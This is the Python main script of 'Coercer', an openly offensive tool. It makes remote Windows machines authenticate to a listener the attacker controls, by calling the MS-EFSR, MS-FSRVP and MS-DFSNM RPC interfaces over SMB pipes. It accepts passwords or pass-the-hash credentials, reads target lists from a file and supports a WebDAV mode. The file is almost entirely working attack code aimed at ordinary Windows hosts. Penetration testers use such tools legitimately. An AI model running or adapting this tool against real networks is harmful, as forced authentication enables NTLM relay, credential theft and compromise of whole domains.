#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : coercer.py
# Author             : Podalirius (@podalirius_)
# Date created       : 6 Jul 2022


import argparse
import os
import sys

from lib.protocols import MS_EFSR, MS_FSRVP, MS_DFSNM
from lib.utils.smb import connect_to_pipe, can_bind_to_protocol, get_available_pipes_and_protocols


VERSION = "1.2"

banner = """
       ______                              
      / ____/___  ___  _____________  _____
     / /   / __ \/ _ \/ ___/ ___/ _ \/ ___/
    / /___/ /_/ /  __/ /  / /__/  __/ /      v%s
    \____/\____/\___/_/   \___/\___/_/       by @podalirius_
""" % VERSION


def parseArgs():
    print(banner)
    parser = argparse.ArgumentParser(add_help=True, description="Automatic windows authentication coercer over various RPC calls.")

    parser.add_argument("-u", "--username", default="", help="Username to authenticate to the endpoint.")
    parser.add_argument("-p", "--password", default="", help="Password to authenticate to the endpoint. (if omitted, it will be asked unless -no-pass is specified)")
    parser.add_argument("-d", "--domain", default="", help="Windows domain name to authenticate to the endpoint.")
    parser.add_argument("--hashes", action="store", metavar="[LMHASH]:NTHASH", help="NT/LM hashes (LM hash can be empty)")
    parser.add_argument("--no-pass", action="store_true", help="Don't ask for password (useful for -k)")
    parser.add_argument("-v", "--verbose", default=False, action="store_true", help="Verbose mode (default: False)")
    parser.add_argument("-a", "--analyze", default=False, action="store_true", help="Analyze mode (default: Attack mode)")
    parser.add_argument("-k", "--kerberos", action="store_true", help="Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line")
    parser.add_argument("--dc-ip", action="store", metavar="ip address", help="IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter")

    listener_group = parser.add_argument_group()
    listener_group.add_argument("-l", "--listener", help="IP address or hostname of the listener machine")
    listener_group.add_argument("-wh", "--webdav-host", default=None, help="WebDAV IP of the server to authenticate to.")
    listener_group.add_argument("-wp", "--webdav-port", default=None, help="WebDAV port of the server to authenticate to.")

    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument("-t", "--target", default=None, help="IP address or hostname of the target machine")
    target_group.add_argument("-f", "--targets-file", default=None, help="IP address or hostname of the target machine")
    parser.add_argument("--target-ip", action="store", metavar="ip address", help="IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name or Kerberos name and you cannot resolve it")

    options = parser.parse_args()

    if options.listener is not None:
        if options.webdav_host is not None or options.webdav_port is not None:
            print("[!] Option --listener cannot be used with --webdav-host or --webdav-port")
        else:
            # Only listener option
            pass
    else:
        if options.webdav_host is not None and options.webdav_port is not None:
            # All WebDAV options are not set
            pass
        else:
            print("[!] Both --webdav-host and --webdav-port options are needed in WebDAV mode.")

    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
    else:
        lmhash, nthash = '', ''

    if options.password == '' and options.username != '' and options.hashes is None and options.no_pass is not True:
        from getpass import getpass
        options.password = getpass("Password:")

    return lmhash, nthash, options


def coerce_auth_target(options, target, lmhash, nthash, all_pipes, available_protocols):
    for pipe in all_pipes:
        dce = connect_to_pipe(pipe=pipe, username=options.username, password=options.password, domain=options.domain, lmhash=lmhash, nthash=nthash, target=target, doKerberos=options.kerberos, dcHost=options.dc_ip, verbose=options.verbose)
        if dce is not None:
            print("   [>] Pipe '%s' is \x1b[1;92maccessible\x1b[0m!" % pipe)
            for protocol in available_protocols:
                if pipe in protocol.available_pipes:
                    dce = connect_to_pipe(pipe=pipe, username=options.username, password=options.password, domain=options.domain, lmhash=lmhash, nthash=nthash, target=target, doKerberos=options.kerberos, dcHost=options.dc_ip, verbose=options.verbose)
                    if dce is not None:
                        if can_bind_to_protocol(dce, protocol.uuid, protocol.version, verbose=options.verbose):
                            protocol_instance = protocol(verbose=options.verbose)
                            protocol_instance.pipe = pipe
                            protocol_instance.connect(username=options.username, password=options.password, domain=options.domain, lmhash=lmhash, nthash=nthash, target=target, doKerberos=options.kerberos, dcHost=options.dc_ip)
                            if options.webdav_host is not None and options.webdav_port is not None:
                                protocol_instance.webdav_host = options.webdav_host
                                protocol_instance.webdav_port = options.webdav_port
                                protocol_instance.perform_coerce_calls(options.listener)
                            elif options.listener is not None:
                                protocol_instance.perform_coerce_calls(options.listener)
        else:
            if options.verbose:
                print("   [>] Pipe '%s' is \x1b[1;91mnot accessible\x1b[0m!" % pipe)


available_protocols = [
    MS_DFSNM, MS_EFSR, MS_FSRVP
]


if __name__ == '__main__':
    lmhash, nthash, options = parseArgs()

    # Getting all pipes of implemented protocols
    all_pipes = []
    for protocol in available_protocols:
        all_pipes += protocol.available_pipes
    all_pipes = list(sorted(set(all_pipes)))
    if options.verbose:
        print("[debug] Detected %d usable pipes in implemented protocols." % len(all_pipes))

    # Parsing targets
    targets = []
    if options.target is not None:
        targets = [options.target]
    elif options.targets_file is not None:
        if os.path.exists(options.targets_file):
            f = open(options.targets_file, 'r')
            targets = sorted(list(set([l.strip() for l in f.readlines()])))
            f.close()
            if options.verbose:
                print("[debug] Loaded %d targets." % len(targets))
        else:
            print("[!] Could not open targets file '%s'." % options.targets_file)
            sys.exit(0)

    for target in targets:
        if options.analyze:
            print("[%s] Analyzing available protocols on the remote machine and interesting calls ..." % target)
            # Getting available pipes
            get_available_pipes_and_protocols(options, target, lmhash, nthash, all_pipes, available_protocols)
        else:
            print("[%s] Analyzing available protocols on the remote machine and perform RPC calls to coerce authentication to %s ..." % (target, options.listener))
            # Call interesting RPC functions to coerce remote machine to authenticate
            coerce_auth_target(options, target, lmhash, nthash, all_pipes, available_protocols)
        print()

    print("[+] All done!")
